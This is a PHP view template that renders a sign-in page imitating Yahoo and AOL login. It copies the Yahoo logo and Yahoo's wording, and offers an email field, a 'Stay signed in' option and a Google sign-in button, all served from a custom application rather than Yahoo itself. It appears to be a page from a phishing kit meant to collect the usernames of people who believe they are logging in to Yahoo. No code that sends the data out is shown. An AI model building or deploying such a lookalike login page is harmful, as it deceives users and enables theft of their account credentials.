<?php $this->view('componets/LoginHeader');?>
<body class="Aol_body_sec">
    <div class="mbr-desktop-hd">
        <span class="column">
            <a href="<?=ROOT?>">
                <img src="<?=ASSETS?>images/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Aol" class="logo " width="100" height="">
            </a>
        </span>
        <span class="column help txt-align-right">
            <a href="#">Help</a>
        </span>
    </div>
        <div class="Aol-Page">
            <div class="login-sec" style="padding-top: 0px">
                <div class="mbr-login-hd txt-align-center">
                    <img src="<?=ASSETS?>images/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Aol" class="logo aol-en-GB" width="100" height="">
                </div> 
                <div class="challenge-header" style="padding-top: 40px;"></div>
                <strong class="challenge-heading">Sign&nbsp;in</strong>
                <span class="page_b challenge-heading" style="display: block;padding: 0;font-size:17px; margin-top:20px; font-weight:200;">using your Yahoo account</span>
                <span class="challenge-desc">&nbsp;</span>
                <form method="POST" class="form-group" id="AolLogin" autocomplete="off">
                    <div class="wrap-input100 validate-input" data-validate="Valid email is: a@b.c"> 
                        <input class="input100" type="text" name="email"> 
                        <span class="bbb-input" data-placeholder="Username, email or mobile"></span> 
                    </div>
                    <div class="login-container-form-btn">
                        <div class="button-row d-flex mt-4">
                            <button class="ml-auto bb-form-btn width-50 ml-auto" type="button">Next</button>
                        </div>
                    </div>
                    <div class="helper-links-container">
                        <div class="helper-item ">
                            <span class="stay-signed-in checkbox-container">
                                <label class="persistent" for="persistent" >
                                    <input id="persistent" name="persistent" value="y" type="checkbox">
                                    Stay signed&nbsp;in
                                </label>
                            </span>
                        </div>
                        <div class="helper-item arlink">
                            <span class="help">
                                <a href="#" id="mbr-forgot-link"  data-rapid-tracking="true">Forgotten&nbsp;username?</a>
                            </span>
                        </div>
                    </div>
                     <div class="login-container-form-btn">
                        <div class="button-row d-flex mt-4">
                            <button class="ml-auto yahoo-bb-form-btn width-50 ml-auto" type="button">Next</button>
                        </div>
                    </div>
                    <div class="login-container-form-btn">
                        <div class="button-row d-flex mt-4 Google-yahoo"> 
                            <p class="text-center google-option">Or, continue with</p>
                            <button class="ml-auto Google-yahoo-bb-form-btn  width-50 ml-auto" type="button">
                                <img src="<?=ASSETS?>images/google.svg" alt="Google" srcset="<?=ASSETS?>images/google.svg"> Google</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
        <!-- error mssg -->
        <!-- Sorry, we don't recognize this email. -->
</body>
</html>